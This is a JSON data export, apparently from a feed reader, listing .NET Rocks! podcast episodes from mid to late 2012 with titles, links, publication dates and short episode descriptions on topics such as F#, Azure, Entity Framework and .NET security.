{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=817","title":"Rocky Lhotka Brings CSLA to Windows 8 and Beyond","published":{"$wrap":"$date","v":1352174400000,"h":"2012-11-06T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Charlotte stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard sit down with Rocky Lhotka to talk about his latest incarnation of CSLA. Yes it's true, Rocky has gotten CSLA running on Windows 8 in the Windows Store (formerly known as Metro) mode. Rocky talks through the challenges of making CSLA work - how do you live without reflection? The conversation turns more philosophical about the direction of development as whole. Computing is undergoing a major inflection point!","author":false,"_id":{"$wrap":"$oid","v":75}}
{"k":"0000000080","o":"0000000451","v":"001"}
{"_id":76,"_uid":76,"_dt":1373728933745,"_s":"956481a5063dd6243ae9dc1845224654"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=816","title":"Julie Lerman Digs Deep on EF5","published":{"$wrap":"$date","v":1351742400000,"h":"2012-11-01T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Atlanta stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard talk to Julie Lerman about Entity Framework 5.","author":false,"_id":{"$wrap":"$oid","v":76}}
{"k":"0000000080","o":"0000000808","v":"001"}
{"_id":77,"_uid":77,"_dt":1373728933746,"_s":"c3694a769a101ee20b14df257d28dfa1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=815","title":"Glenn Block Talks Node.js, WebAPI and China!","published":{"$wrap":"$date","v":1351569600000,"h":"2012-10-30T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Philly stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard talk to Glenn Block about Node.js, WebAPI and China. The conversation digs into the philosophical differences of Node, JavaScript outside the browser, and starting from a blank slate of services, rather than the 'everything-on' model of yester-year. Glenn also talks about his experiences in China, engaging the local development community in Shanghai, and the tools and preferences there.","author":false,"_id":{"$wrap":"$oid","v":77}}
{"k":"0000000080","o":"0000000672","v":"001"}
{"_id":78,"_uid":78,"_dt":1373728933747,"_s":"ff4cecd4d730c518f24006b1caaa1ccd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=814","title":"Kim Tripp Makes Us Drink From the Firehose","published":{"$wrap":"$date","v":1351137600000,"h":"2012-10-25T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the New York stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip event, Carl and Richard talk to Kim Tripp and have to drink from the SQL Server firehose! Kim runs down the key things she thinks developers need to know about making their databases perform well today and tomorrow as their application becomes bigger and more successful.","author":false,"_id":{"$wrap":"$oid","v":78}}
{"k":"0000000080","o":"0000000818","v":"001"}
{"_id":79,"_uid":79,"_dt":1373728933748,"_s":"c5ba0c26c1272a97da628c4b585736b1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=813","title":"Don Syme and Keith Battocchi Bring F# Everywhere","published":{"$wrap":"$date","v":1350964800000,"h":"2012-10-23T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Boston stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard talk to Don Syme and Keith Battocchi about F# 3.0. Don and Keith talk about their roles in building F#, still being part of Microsoft Research and working with Microsoft's Developer Division in Redmond. The conversation also digs into F#'s ability to create type providers for accessing internal and external data as if it is part of the language. Call it the ultimate extension to IntelliSense!","author":false,"_id":{"$wrap":"$oid","v":79}}
{"k":"0000000080","o":"0000000848","v":"001"}
{"_id":80,"_uid":80,"_dt":1373728933749,"_s":"7fe05a0c22ce6030b1118a882d9bd899"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=812","title":"Michele Leroux Bustamante Uses Azure with Her Start up!","published":{"$wrap":"$date","v":1350446400000,"h":"2012-10-17T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Toronto stop of the .NET Rocks! Visual Studio Launch Road Trip, Carl and Richard talked to Michele Leroux Bustamante about her experiences running a start-up using Azure. Michele talks about how she's been able to bootstrap her startup company SnapBoard with no external funding. The conversation digs into how you can get free Azure services using MSDN, BizSpark and BizSpark Plus, as well as the process of doing a lean start up - don't build more than you have to and get as much feedback as you can!","author":false,"_id":{"$wrap":"$oid","v":80}}
{"k":"0000000080","o":"0000000841","v":"001"}
{"_id":81,"_uid":81,"_dt":1373728933750,"_s":"dbf77892cafe7d193199c9e88020cbee"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=811","title":"Alan Stevens and Leon Gersing Discuss Leading Developers","published":{"$wrap":"$date","v":1350360000000,"h":"2012-10-16T04:00:00.000Z"},"starred":false,"read":false,"content":"While in Columbus, Ohio on the .NET Rocks! Visual Studio 2012 Road Trip, Carl and Richard talk to Alan Stevens and Leon Gersing about leading a group of developers in a project. Alan and Leon tell stories of how they evolved into leaders, talking about the things they did right and wrong (mostly wrong). The conversation also explores how you can grow as a leader of developers without giving up development, and how to deal with the poisonous people in your organization. Great thinking from great leaders!","author":false,"_id":{"$wrap":"$oid","v":81}}
{"k":"0000000080","o":"0000000680","v":"001"}
{"_id":82,"_uid":82,"_dt":1373728933751,"_s":"586ca5626e89391e1f78844fcb9c104f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=810","title":"Architecture at DevReach","published":{"$wrap":"$date","v":1349928000000,"h":"2012-10-11T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevReach in Bulgaria, Carl and Richard moderated a panel on architecture with panelists Steve Smith, Miguel Castro and Charles Nurse. The conversation ranged over a broad swath of architecture topics, talking about brownfield and greenfield design, different scales of architectures, the tension between developers and architects, how to do both roles at once, and more!","author":false,"_id":{"$wrap":"$oid","v":82}}
{"k":"0000000080","o":"0000000680","v":"001"}
{"_id":83,"_uid":83,"_dt":1373728933752,"_s":"f514fab0024020f95239c35290fceb4b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=809","title":"Web Performance at DevReach","published":{"$wrap":"$date","v":1349755200000,"h":"2012-10-09T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevReach, Carl and Richard hosted a panel on web performance with panelists Steve Smith, Kent Alstad and Paul Carvalho. The conversation starts with the challenge of good instrumentation, different techniques, and values for measuring performance. The panel also explores load testing, caching and other performance techniques - lots of deep dives into hard concepts!","author":false,"_id":{"$wrap":"$oid","v":83}}
{"k":"0000000080","o":"0000000815","v":"001"}
{"_id":84,"_uid":84,"_dt":1373728933753,"_s":"136269cc564b9efd847b565bc770e1a1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=808","title":"The Humanitarian Toolbox!","published":{"$wrap":"$date","v":1349323200000,"h":"2012-10-04T04:00:00.000Z"},"starred":false,"read":false,"content":"On the .NET Rocks! Visual Studio 2012 Road Trip stop in Chicago, Carl and Richard sat down with Tony Surma of Microsoft to talk about disaster relief. During the discussion Tony announces a new initative being supported by Microsoft called the Humanitarian Toolbox. The goal of the Humanitarian Toolbox is to improve the response capabilities of lead disaster response organizations by creating a toolbox of software that can be stood up quickly when needed. Want to help save the world with software? Contribute!","author":false,"_id":{"$wrap":"$oid","v":84}}
{"k":"0000000080","o":"0000000693","v":"001"}
{"_id":85,"_uid":85,"_dt":1373728933754,"_s":"ed03e138499191e7b3c1bb63d1a7b755"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=807","title":"Bill Wagner Deals With Change","published":{"$wrap":"$date","v":1349150400000,"h":"2012-10-02T04:00:00.000Z"},"starred":false,"read":false,"content":"At the Omaha stop of the .NET Rocks! Visual Studio 2012 Launch Road Trip, Carl and Richard chatted with Bill Wagner. Bill talks about the approaching tidal wave of change coming in computing, between tablets, mobile, cloud and more. Rather than focus on the technology, Bill focuses on how individuals cope with change to move forward into a new world still be able to produce good code.","author":false,"_id":{"$wrap":"$oid","v":85}}
{"k":"0000000080","o":"0000000718","v":"001"}
{"_id":86,"_uid":86,"_dt":1373728933754,"_s":"7a5b0e904b67eb6c4ba232d2689a6ca1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=806","title":"Dr. Yngve Falck-Ytter talks Medicine and Software","published":{"$wrap":"$date","v":1348718400000,"h":"2012-09-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Dr. Yngve Falck-Ytter about his efforts to understand programming. Yngve talks about the limitations of the software in the medical industry and how he's learned to work around it with some of his own programming. Ultimately the conversation digs into the idea that good software can make treatments more effective and less expensive and, in the end, save more lives.","author":false,"_id":{"$wrap":"$oid","v":86}}
{"k":"0000000080","o":"0000000476","v":"001"}
{"_id":87,"_uid":87,"_dt":1373728933756,"_s":"911042abe8c4822f5905b9f362bdace3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=805","title":"Sells and Hanselman Together in Portland on the Road Trip","published":{"$wrap":"$date","v":1348545600000,"h":"2012-09-25T04:00:00.000Z"},"starred":false,"read":false,"content":"What happens when you put Chris Sells and Scott Hanselman on the same stage at the same time in front of 200 folks in Portland? Have a listen!","author":false,"_id":{"$wrap":"$oid","v":87}}
{"k":"0000000080","o":"0000000841","v":"001"}
{"_id":88,"_uid":88,"_dt":1373728933757,"_s":"d4ec886d56162de694135f65b33a6004"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=804","title":"Ian Felton Aids School Marching Bands with Technology","published":{"$wrap":"$date","v":1348113600000,"h":"2012-09-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Ian Felton about his charity efforts. Ian talks about exercising different programming skills on different charitable projects so that he has a chance to get code into production with a lower set of demands. Ian also talks about a charity he started called Marching Mountains for getting used instruments out of closets and into the hands of students in marching bands of disadvantaged counties in Appalachia. Ian's message to us is to get involved in something you're passionate about!","author":false,"_id":{"$wrap":"$oid","v":88}}
{"k":"0000000080","o":"0000000767","v":"001"}
{"_id":89,"_uid":89,"_dt":1373728933758,"_s":"16a65f6ca088a92bf7f14db139ea62c2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=803","title":"Alex Robson Programs a Polyglot","published":{"$wrap":"$date","v":1347940800000,"h":"2012-09-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Alex Robson about polyglot programming. Alex talks about various languages including Erlang. He focuses on the idea that different languages have different strength, and trying to function in a monoculture of only one programming language limits your ability to solve problems efficiently. The conversation goes on to talk about the different patterns of development available once you stop thinking about the limits of your language!","author":false,"_id":{"$wrap":"$oid","v":89}}
{"k":"0000000080","o":"0000000657","v":"001"}
{"_id":90,"_uid":90,"_dt":1373728933759,"_s":"a80204c6261d683696fe76f8f7a6c37d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=802","title":"Alan Stevens Talks Leadership","published":{"$wrap":"$date","v":1347508800000,"h":"2012-09-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Alan Stevens about leadership in software development. Really, leadership in everything. The conversation digs into the issues of trust, value, play and food being key to success in leading any kind of project. Alan tells some great stories about how to make leadership work. If you're looking to lead, this is a show for you!","author":false,"_id":{"$wrap":"$oid","v":90}}
{"k":"0000000080","o":"0000000976","v":"001"}
{"_id":91,"_uid":91,"_dt":1373728933760,"_s":"2d8871d3180b2bab712f7c0b8920056c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=801","title":"Jon Rozenblit Explores Azure's New Features","published":{"$wrap":"$date","v":1347336000000,"h":"2012-09-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jon Rozenblit about the latest set of features in Azure. The conversation starts with a discussion about Azure Mobile Services, which is really a REST storage system that doesn't need to involve mobile at all - maybe they'll fix the name! Next, with Richard's encouragement, Carl talks about his need for virtual machines and Jon digs into the features of the new virtual machine features in Azure. Jon also tackles the challenge of pricing, running on premise and how the new features in Azure make things easier for moving from on-premise to cloud and back again. Great conversation if you're ready to take a fresh look at Azure!","author":false,"_id":{"$wrap":"$oid","v":91}}
{"k":"0000000080","o":"0000000419","v":"001"}
{"_id":92,"_uid":92,"_dt":1373728933760,"_s":"c47bcba2967ac97c4a88ba296bf813bf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=800","title":"Show 800!","published":{"$wrap":"$date","v":1346904000000,"h":"2012-09-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Wow, show 800! Carl and Richard invite Scott Hanselman and Rob Conery to chat about what happens when you make 800 podcasts in a row.","author":false,"_id":{"$wrap":"$oid","v":92}}
{"k":"0000000080","o":"0000000850","v":"001"}
{"_id":93,"_uid":93,"_dt":1373728933761,"_s":"47b92c102dfad46b58717b2d822692cb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=799","title":"Phil Trelford Codes in F# 3.0","published":{"$wrap":"$date","v":1346731200000,"h":"2012-09-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Phil Trelford about the new features in F# 3.0, the version shipping with Visual Studio 2012. Phil talks about how F# is functional first, object second, as opposed to C# which is object first, functional second - but the two languages work together fine. He also digs into using F# with XAML to do UI related work. The conversation turns to projects using F# including it's role in Halo 3! F# is at its magic third version! Check out the ton of links to this show, all sorts of great stuff for getting started with F#.","author":false,"_id":{"$wrap":"$oid","v":93}}
{"k":"0000000080","o":"0000001016","v":"001"}
{"_id":94,"_uid":94,"_dt":1373728933762,"_s":"1b42ae63baa5996c6ace2aeeb049852c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=798","title":"Chris Patterson Builds MassTransit","published":{"$wrap":"$date","v":1346299200000,"h":"2012-08-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Chris Patterson about MassTransit, an open source enterprise service bus. The conversation starts out talking about service bus in general, how the patterns around a service bus make it easier to build large, multiversion applications with the fewest dependencies possible. Chris sets MassTransit in context with large, expensive service buses like Biztalk. He also digs into some of the other projects he's worked on, including TopShelf (for building Windows services) and Magnum (the mother of all toolkits). The boys also ask Chris about his focus on open source, the advantages and disadvantages around licensing, pricing and support. Amazing smart guy with some awesome code!","author":false,"_id":{"$wrap":"$oid","v":94}}
{"k":"0000000080","o":"0000000615","v":"001"}
{"_id":95,"_uid":95,"_dt":1373728933763,"_s":"4f840d676b4924e87bf78e2a695ab11d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=797","title":"Mark Seemann Talks Web API and REST","published":{"$wrap":"$date","v":1346126400000,"h":"2012-08-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mark Seemann about building web applications using Web API and REST. The conversation starts out with the hard part - so what is REST exactly anyway? Mark digs into the history and meaning behind REST and the challenges that those practices bring to real world web applications.","author":false,"_id":{"$wrap":"$oid","v":95}}
{"k":"0000000080","o":"0000000848","v":"001"}
{"_id":96,"_uid":96,"_dt":1373728933764,"_s":"723ad1d6f2fea5d840426c2a12cb349f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=796","title":"Carl and Richard Geek Out About Mars","published":{"$wrap":"$date","v":1345694400000,"h":"2012-08-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Ready to geek out on Mars? Carl and Richard chat about the Mars Science Laboratory's arrival at Mars. Richard digs into the history of Mars exploration, from the Mariner missions in the 1960s to the amazing Viking landers in the 1970s, and finally to the modern era with the loss of Mars Observer and the triumphs of rovers like Sojourner, Spirit, Opportunity and finally Curiosity. The conversation goes on to the future of Mars exploration - what about a sample return mission? What will it take to get humans on the surface of Mars?","author":false,"_id":{"$wrap":"$oid","v":96}}
{"k":"0000000080","o":"0000000896","v":"001"}
{"_id":97,"_uid":97,"_dt":1373728933765,"_s":"2339d11e69b1086e7380695fc075b0ca"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=795","title":"Chris Jackson Makes Applications Compatible","published":{"$wrap":"$date","v":1345521600000,"h":"2012-08-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Chris Jackson of Microsoft about all the tricks and techniques he uses to make applications compatible from one version of Windows to another, or one version of Internet Explorer to another. Chris digs into the mistakes that developers make, such as checking what version of an operating system or browser a user has. He also points out the cool tools built into Windows to lie to applications to overcome these problems. The conversation also digs into moving your application to Windows 8 and Internet Explorer 10. A must if you're ready to upgrade!","author":false,"_id":{"$wrap":"$oid","v":97}}
{"k":"0000000080","o":"0000000775","v":"001"}
{"_id":98,"_uid":98,"_dt":1373728933766,"_s":"cfd4ea619a6371b47656d5b652ed235a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=794","title":"Sahil Malik Digs Into SharePoint 2013","published":{"$wrap":"$date","v":1345089600000,"h":"2012-08-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Sahil Malik about the upcoming 2013 edition of SharePoint. Sahil digs into the new features in 2013, including better workflows, content management and performance - document updates send only the deltas to SQL Server! The conversation turns to the new app model in SharePoint 2013, its power and potential for exploitation. Sahil finishes up talking about the cloud, search and mobile features. Sharepoint 2013 is a great step forward!","author":false,"_id":{"$wrap":"$oid","v":98}}
{"k":"0000000080","o":"0000001198","v":"001"}
{"_id":99,"_uid":99,"_dt":1373728933767,"_s":"24739b985a1ef537793956794f7cbd72"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=793","title":"Brian Harry Manages Development with Studio 2012","published":{"$wrap":"$date","v":1344916800000,"h":"2012-08-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Microsoft tech fellow Brian Harry about Application Lifecycle Management with Visual Studio 2012 and Team Foundation Server. Brian digs into the thinking around the latest version of Microsoft's ALM offering, including the new tools for gathering requirements using storyboards, video, audio and annotations around applications. The conversation also digs into the core 'lather-rinse-repeat' cycle of developers getting work assignments, building and checking in their code. Then onto the amazing new features in testing and providing early look versions of applications for gathering feedback. Finally Brian talks about Team Foundation Services, TFS-in-the-Cloud so to speak, which while not directly tied to Studio 2012, does point to Microsoft's future focus for ALM. A great conversation with a guy at the center of everything ALM at Microsoft!","author":false,"_id":{"$wrap":"$oid","v":99}}
{"k":"0000000082","o":"0000000893","v":"001"}
{"_id":100,"_uid":100,"_dt":1373728933768,"_s":"92fc7847d53a63ffbce0f450e965b5d7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=792","title":"Jason Zander Ships Visual Studio 2012!","published":{"$wrap":"$date","v":1344484800000,"h":"2012-08-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Microsoft VP Jason Zander about the release of Visual Studio 2012 and .NET 4.5. Jason addresses many of the key points around building Studio 2012 - the deep integration with Windows 8, how the teams worked together to allow the C++/XAML, C#/XAML and HTML5/WinJS development approaches... even why the Studio 2012 UI looks the way it does! The conversation then jumps to developing for ARM, some time talking about cloud development, even a mention of Sharepoint and Office tools. Great insight from a guy who has been part of .NET since the beginning!","author":false,"_id":{"$wrap":"$oid","v":100}}
{"k":"0000000082","o":"0000000867","v":"001"}
{"_id":101,"_uid":101,"_dt":1373728933769,"_s":"f5638c7b635c836d7330235043e2b7a8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=791","title":"Julie Lerman Explores Entity Framework 5","published":{"$wrap":"$date","v":1344312000000,"h":"2012-08-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard chat with Julie Lerman about Entity Framework 5. EF5 ships with .NET 4.5 - yep, they broke the number synchronization this time around. Julie explains that the big number change is for a good reason - this is a big update to Entity Framework. The conversation digs into the new features, including performance improvements, enumerations and spatial datatype support. Julie also talks about a huge number of little things that are added to make EF a much more useable project. Has the magic version three happened again at Microsoft?","author":false,"_id":{"$wrap":"$oid","v":101}}
{"k":"0000000082","o":"0000000663","v":"001"}
{"_id":102,"_uid":102,"_dt":1373728933770,"_s":"51d26746e4bea4d02da838519900befd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=790","title":"Jay Schmelzer and Chris Finlan Build HTML 5 Apps with Lightswitch","published":{"$wrap":"$date","v":1343880000000,"h":"2012-08-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jay Schmelzer and Chris Finlan about LightSwitch. Jay is one of the leaders of LightSwitch at Microsoft and talks about some of the new features coming in LightSwitch including HTML 5 clients. Chris works for SAP and builds line-of-business applications there, including building in LightSwitch.","author":false,"_id":{"$wrap":"$oid","v":102}}
{"k":"0000000082","o":"0000000744","v":"001"}
{"_id":103,"_uid":103,"_dt":1373728933771,"_s":"aeb80e0d0d4b7e214afa0f6f7d28e818"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=789","title":"Andrew Arnott Logs In with DotNetOpenAuth","published":{"$wrap":"$date","v":1343707200000,"h":"2012-07-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Andrew Arnott about DotNetOpenAuth. DotNetOpenAuth is an implementation of OAuth, OpenID and InfoCard technologies is an easy-to-use-package for .NET developers. Andrew talks about the evolution, features and challenges of each of the respective technologies. DotNetOpenAuth is available today and will be bundled with Visual Studio 2012. Get on the identification and authentication bandwagon today!","author":false,"_id":{"$wrap":"$oid","v":103}}
{"k":"0000000082","o":"0000000838","v":"001"}
{"_id":104,"_uid":104,"_dt":1373728933772,"_s":"94d7824b4e195d368c53d0883bb393d4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=788","title":"Jon McCoy Hacks .NET","published":{"$wrap":"$date","v":1343275200000,"h":"2012-07-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Darth Vader, a.k.a. Jon McCoy who shows developers how to hack .NET apps in memory and on disk. This turns into a pretty dark discussion about how challenging it is to secure in depth - infiltration and exfiltration vectors, how protection tools (like anti-virus) are great mechanisms for spreading malware. And according to Jon, .NET is a great tool for hiding malicious code. He talks about how he can modify a .NET application while it is running and use it to manipulate and steal information. Not a happy show!","author":false,"_id":{"$wrap":"$oid","v":104}}
{"k":"0000000082","o":"0000000723","v":"001"}
{"_id":105,"_uid":105,"_dt":1373728933774,"_s":"d2efc1d4028a8c85d8c5774705d07c98"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=787","title":"Michael Heydt Develops with TPL Dataflows","published":{"$wrap":"$date","v":1343102400000,"h":"2012-07-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Michael Heydt about the Task Parallel Library Dataflows feature added in .NET 4.5. Moving beyond the basics of the TPL, Michael digs into how the various pattern blocks of TDF help you build real-world parallel executing applications. There's a lot to learn, but TDF makes building parallel applications far more management. Get away from parallel plumbing and into what matters!","author":false,"_id":{"$wrap":"$oid","v":105}}
{"k":"0000000082","o":"0000000786","v":"001"}
{"_id":106,"_uid":106,"_dt":1373728933774,"_s":"52795011a602c364e5ae95f39236b73a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=786","title":"Bruce Lawson Has Responsive Web Design","published":{"$wrap":"$date","v":1342670400000,"h":"2012-07-19T04:00:00.000Z"},"starred":false,"read":false,"content":"At NDC, Carl and Richard talk to Bruce Lawson about responsive web design. Responsive web design from Bruce's point of view is web pages that are able to adjust to the browser and device that they are being viewed on. From the huge displays on desktop PCs to the tiny screens of smartphones, you can make your web pages work effectively! Bruce talks about some of the tools and libraries available to simplify responsive web design, so check out the links from the show!","author":false,"_id":{"$wrap":"$oid","v":106}}
{"k":"0000000082","o":"0000000806","v":"001"}
{"_id":107,"_uid":107,"_dt":1373728933775,"_s":"d90086ce10c348f3a203c323015a392f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=785","title":"Lucian Wischik Enlightens Us on Async and Parallelism","published":{"$wrap":"$date","v":1342497600000,"h":"2012-07-17T04:00:00.000Z"},"starred":false,"read":false,"content":"At NDC in Oslo, Carl and Richard talk to Lucian Wischik about using Async and Await in .NET 4 and 4.5. Lucian talks through some great scenarios of how you can use Async and Await effectively, as well as the mistakes developers can make. Method blocking and Async don't get along! The conversation also explores the differences between asynchronicity and parallelism, they aren't the same thing at all. Get ready for some awesomely lucid thinking about Async and parallelism!","author":false,"_id":{"$wrap":"$oid","v":107}}
{"k":"0000000082","o":"0000000965","v":"001"}
{"_id":108,"_uid":108,"_dt":1373728933776,"_s":"011054757bd30bf353d02a9530297a4d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=784","title":"Uncle Bob Talks about the Future of Object Orientation","published":{"$wrap":"$date","v":1342065600000,"h":"2012-07-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Bob Martin about where object orientation is going. Bob starts out talking about the fundamentals of where object orientation came from and how it has progressed over the years. The conversation then digs into how hardware has changed - the CPU manufacturers have stopped making faster processors and switched to making more processors. The impact of this change means developers have to write parallel executing code, something that object orientation makes difficult. Bob talks about the resurgence of functional programming as a reaction to the need for parallelism. Has object orientation run its course?","author":false,"_id":{"$wrap":"$oid","v":108}}
{"k":"0000000082","o":"0000000919","v":"001"}
{"_id":109,"_uid":109,"_dt":1373728933777,"_s":"be73feeeb50b740626c112fb4944dc91"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=783","title":"Hadi Hariri Does Real World MVC","published":{"$wrap":"$date","v":1341892800000,"h":"2012-07-10T04:00:00.000Z"},"starred":false,"read":false,"content":"While at NDC is Oslo, Norway, Carl and Richard talk to Hadi Hariri about MVC. Hadi talks about his experiences building MVC applications, starting with where WebForms taught some bad habits in web application construction, how some of the new Javascript libraries (like jQuery) made MVC more palatable and the performance advantages of well designed MVC. The conversation also digs into some of the mistakes novice MVC developers make, like putting far too much (and repeating) code in the controller. There's also a discussion about different data storage options as well as Hadi's position on utilizing REST.","author":false,"_id":{"$wrap":"$oid","v":109}}
{"k":"0000000082","o":"0000001004","v":"001"}
{"_id":110,"_uid":110,"_dt":1373728933778,"_s":"db59310650aa099eaff929cd89c13e25"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=782","title":"Sondre Bjellas Builds Apps for Facebook","published":{"$wrap":"$date","v":1341460800000,"h":"2012-07-05T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Norwegian Developers Conference in Oslo, Carl and Richard talk to an actual Norwegian! Sondre Bjellås sits down with the boys to talk about building applications in Facebook. The conversation starts off with discussion about oAuth, specifically authenticating with Facebook. Sondre talks about how Facebook provides information back to you as the developer about the users that log into your web site or application - provided the user gives permission. The conversation continues into the different species of Facebook applications you can build, running inside Facebook, separately and using the social graph. A great starting point for getting into Facebook programming!","author":false,"_id":{"$wrap":"$oid","v":110}}
{"k":"0000000082","o":"0000000793","v":"001"}
{"_id":111,"_uid":111,"_dt":1373728933779,"_s":"e4d11ef814877e5c61be10f239f69e3e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=781","title":"Remy Sharp Still Building Web Pages with HTML 5","published":{"$wrap":"$date","v":1341288000000,"h":"2012-07-03T04:00:00.000Z"},"starred":false,"read":false,"content":"While at NDC, Carl and Richard talk to Remy Sharp about HTML 5. Remy discusses the state of things, how the diversity of browsers is as much a strength as a problem. He digs into the idea that you need to build your web app for the audience you have - perhaps it needs more support for older browsers, or focus on the latest features for the newest browsers. Check out the great collection of links to different services and sites that Remy mentions in the discussion!","author":false,"_id":{"$wrap":"$oid","v":111}}
{"k":"0000000082","o":"0000000631","v":"001"}
{"_id":112,"_uid":112,"_dt":1373728933780,"_s":"da00f34929c8b1d15948898eb90ab77d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=780","title":"The State of Development Methodology at DevTeach","published":{"$wrap":"$date","v":1340856000000,"h":"2012-06-28T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevTeach, Carl and Richard hosted a panel discussion on development methodology. Panelists James Kovacs, Mario Cardinal, Charles Max Wood and Rob Daigneau explored the state of development methodology today. The discussion roamed over Waterfall, Agile, XP, Lean, Scrum But, Scrum And... and more.","author":false,"_id":{"$wrap":"$oid","v":112}}
{"k":"0000000082","o":"0000000930","v":"001"}
{"_id":113,"_uid":113,"_dt":1373728933781,"_s":"48a0ed96634f863c9ba931755b1fe1d3"}
